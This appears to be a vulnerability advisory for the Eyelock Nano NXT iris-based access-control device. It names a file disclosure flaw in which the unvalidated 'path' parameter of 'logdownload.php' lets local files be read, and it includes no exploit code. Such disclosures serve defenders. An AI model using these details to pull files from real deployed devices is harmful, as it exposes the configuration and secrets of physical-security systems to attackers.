Summary: Nano NXT is the most advanced compact iris-based identity authentication device
in Eyelock's comprehensive suite of end-to-end identity authentication solutions.
Nano NXT is a miniaturized iris-based recognition system capable of providing
real-time identification, both in-motion and at a distance. The Nano NXT is an
ideal replacement for card-based systems, and seamlessly controls access to turnstiles,
secured entrances, server rooms and any other physical space. Similarly the device
is powerful and compact enough to secure high-value transactions, critical databases,
network workstations or any other information system.

Desc: nano NXT suffers from a file disclosure vulnerability when input passed thru the
'path' parameter to 'logdownload.php' script is not properly verified before being used
to read files. This can be exploited to disclose contents of files from local resources.
